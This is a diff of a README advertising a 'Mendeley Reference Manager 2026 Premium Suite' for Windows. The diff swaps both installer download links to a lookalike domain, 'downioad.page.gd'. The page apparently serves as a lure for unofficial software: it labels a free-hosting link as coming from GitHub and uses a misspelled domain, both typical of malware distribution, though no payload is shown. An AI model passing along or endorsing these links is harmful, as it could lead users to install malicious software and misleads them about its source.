@@ -2,7 +2,7 @@
 
 Mendeley Reference Manager 2026 Premium Suite is a comprehensive tool designed to elevate your academic research and citation management on Windows 10 and 11. This enhanced suite integrates advanced plugins, unlimited storage, and collaborative features to streamline workflows for researchers, students, and professionals.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -51,7 +51,7 @@ A: The application will notify you of updates automatically. You can also check 
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
